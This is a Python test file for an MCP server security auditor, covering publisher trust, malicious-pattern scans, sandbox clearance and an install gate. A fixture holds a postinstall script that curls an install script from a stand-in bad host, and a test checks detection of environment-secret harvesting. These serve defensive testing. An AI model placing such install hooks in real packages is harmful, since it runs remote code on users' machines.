"""
tests/test_mcp_security.py - MCP security audit tests.
"""

import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

import nx_mcp
import nx_mcp_sandbox
import nx_mcp_security


class SecurityTestCase(unittest.TestCase):
    def setUp(self):
        self.tmpdir = tempfile.TemporaryDirectory()
        tmp_path = Path(self.tmpdir.name)
        self.patchers = [
            patch.object(nx_mcp_sandbox, "SANDBOX_ROOT", tmp_path / "sandbox"),
            patch.object(nx_mcp_sandbox, "CLEARED_PATH", tmp_path / "cleared.json"),
            patch.object(nx_mcp, "NX_HOME", tmp_path),
            patch.object(nx_mcp, "MCP_CONFIG_PATH", tmp_path / "mcp_config.json"),
            patch.object(nx_mcp, "MCP_CREDENTIALS_PATH", tmp_path / "mcp_credentials.json"),
            patch.object(nx_mcp_security.Path, "home", return_value=tmp_path),
        ]
        for patcher in self.patchers:
            patcher.start()
            self.addCleanup(patcher.stop)
        self.addCleanup(self.tmpdir.cleanup)


class TestPublisherTrust(SecurityTestCase):
    def setUp(self):
        super().setUp()
        self.auditor = nx_mcp_security.MCPSecurityAuditor()

    def test_trusted_publisher_passes(self):
        result = self.auditor.audit_publisher("npx -y @modelcontextprotocol/server-github")
        self.assertTrue(result["trusted"])
        self.assertEqual(result["level"], "PASS")

    def test_unknown_publisher_is_flagged(self):
        result = self.auditor.audit_publisher("npx -y @sketchy-unknown/mcp")
        self.assertFalse(result["trusted"])
        self.assertEqual(result["level"], "UNKNOWN")

    def test_registry_publishers_are_trusted(self):
        untrusted = []
        for name, mcp in nx_mcp.MCP_REGISTRY.items():
            result = self.auditor.audit_publisher(mcp["install"])
            if not result["trusted"]:
                untrusted.append(name)
        self.assertEqual(untrusted, [])


class TestSecurityScans(SecurityTestCase):
    def setUp(self):
        super().setUp()
        self.auditor = nx_mcp_security.MCPSecurityAuditor()

    def test_detects_env_harvesting_pattern(self):
        import re

        pattern_found = any(
            re.search(pattern, "process.env['SECRET_KEY']", re.IGNORECASE)
            for pattern in nx_mcp_security.MALICIOUS_PATTERNS
        )
        self.assertTrue(pattern_found)

    @patch("nx_mcp_security.subprocess.run")
    def test_network_permissions_warn_on_http_scripts(self, mock_run):
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout='{"scripts":{"postinstall":"curl https://bad.example/install.sh"}}',
            stderr="",
        )
        result = self.auditor.audit_network_permissions("@example/mcp")
        self.assertEqual(result["level"], "WARN")
        self.assertIn("postinstall", result["suspicious_scripts"])

    def test_credential_isolation_returns_pass(self):
        result = self.auditor.audit_credential_isolation("github", "GITHUB_TOKEN")
        self.assertEqual(result["level"], "PASS")
        self.assertGreater(len(result["checks"]), 0)


class TestSandbox(SecurityTestCase):
    def test_is_cleared_false_before_audit(self):
        self.assertFalse(nx_mcp_sandbox.is_cleared("github"))

    def test_mark_cleared_persists_state(self):
        nx_mcp_sandbox.mark_cleared(
            "github",
            {"overall": "PASS", "safe_to_integrate": True},
        )
        self.assertTrue(nx_mcp_sandbox.is_cleared("github"))

    def test_integrate_blocked_without_clearance(self):
        result = nx_mcp_sandbox.integrate_cleared("github")
        self.assertFalse(result["success"])
        self.assertIn("security audit", result["error"])

    def test_integrate_succeeds_after_clearance(self):
        nx_mcp_sandbox.mark_cleared(
            "github",
            {"overall": "PASS", "safe_to_integrate": True},
        )
        sandbox_path = nx_mcp_sandbox.SANDBOX_ROOT / "github"
        sandbox_path.mkdir(parents=True, exist_ok=True)
        result = nx_mcp_sandbox.integrate_cleared("github")
        self.assertTrue(result["success"])


class TestSecurityGateOnInstall(SecurityTestCase):
    @patch("nx_mcp.is_cleared", return_value=False)
    def test_install_blocked_without_audit(self, mock_is_cleared):
        result = nx_mcp.install_mcp("github")
        self.assertFalse(result["success"])
        self.assertIn("security audit", result["error"])
        mock_is_cleared.assert_called_once_with("github")

    @patch("nx_mcp.subprocess.run")
    @patch("nx_mcp.is_cleared", return_value=True)
    def test_install_proceeds_after_clearance(self, mock_is_cleared, mock_run):
        mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")
        result = nx_mcp.install_mcp("github")
        self.assertTrue(result["success"])
        mock_is_cleared.assert_called_once_with("github")


if __name__ == "__main__":
    unittest.main()
